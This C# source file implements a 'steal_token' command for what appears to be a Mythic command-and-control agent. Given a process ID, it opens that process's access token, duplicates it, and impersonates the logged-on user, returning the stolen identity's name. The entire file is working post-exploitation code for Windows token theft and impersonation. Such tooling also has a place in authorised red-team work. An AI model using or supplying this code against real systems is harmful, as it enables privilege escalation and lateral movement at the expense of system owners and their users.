using Models.Tasks;

using Extend;

using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Text;

namespace Tasks.Commands
{
    public class StealToken : CerberusCommand
    {
        public override string Name => "steal_token";

        public override MythicTaskResult Execute(MythicTask task)
        {
            MythicTaskResult result;

            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<StealTokenParam>();

            if (!int.TryParse(Arguments.pid, out var pid))
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Failed to parse PID",
                    completed = true,
                    status = "Error",
                    error = "Failed to parse PID"
                };

                return result;
            }

            // open handle to process
            var process = Process.GetProcessById(pid);

            var hToken = IntPtr.Zero;
            var hTokenDup = IntPtr.Zero;

            try
            {
                // open handle to token
                if (!Native.Advapi.OpenProcessToken(process.Handle, Native.Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
                {
                    result = new MythicTaskResult
                    {
                        task_id = task.id,
                        user_output = "Failed to open process token",
                        completed = true,
                        status = "Error",
                        error = "Failed to open process token"
                    };

                    return result;
                }


                // duplicate token
                var sa = new Native.Advapi.SECURITY_ATTRIBUTES();
                if (!Native.Advapi.DuplicateTokenEx(hToken, Native.Advapi.TokenAccess.TOKEN_ALL_ACCESS, ref sa, Native.Advapi.SecurityImpersonationLevel.SECURITY_IMPERSONATION,
                    Native.Advapi.TokenType.TOKEN_IMPERSONATION, out hTokenDup))
                {
                    result = new MythicTaskResult
                    {
                        task_id = task.id,
                        user_output = "Failed to duplicate token",
                        completed = true,
                        status = "Error",
                        error = Marshal.GetLastWin32Error().ToString()
                    };

                    return result;
                }

                // impersonate token
                if (Native.Advapi.ImpersonateLoggedOnUser(hTokenDup))
                {
                    var identity = new WindowsIdentity(hTokenDup);

                    result = new MythicTaskResult
                    {
                        task_id = task.id,
                        user_output = $"Successfully impersonated {identity.Name}",
                        completed = true,
                        status = "success"
                    };

                    return result;
                }

                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Failed to impersonate token",
                    completed = true,
                    status = "Error",
                    error = Marshal.GetLastWin32Error().ToString()
                };
                return result;
            }
            catch (Exception ex)
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = ex.Message,
                    completed = true,
                    status = "Error",
                    error = Marshal.GetLastWin32Error().ToString()
                };
            }
            finally
            {
                // close token handles

                if (hToken != IntPtr.Zero) Native.Kernel32.CloseHandle(hToken);
                if (hTokenDup != IntPtr.Zero) Native.Kernel32.CloseHandle(hTokenDup);

                process.Dispose();
            }

            result = new MythicTaskResult
            {
                task_id = task.id,
                user_output = "Unknown Error",
                completed = true,
                status = "Error",
                error = Marshal.GetLastWin32Error().ToString()
            };

            return result;
        }
    }

    public class StealTokenParam
    {
        public string pid { get; set; }
    }
}
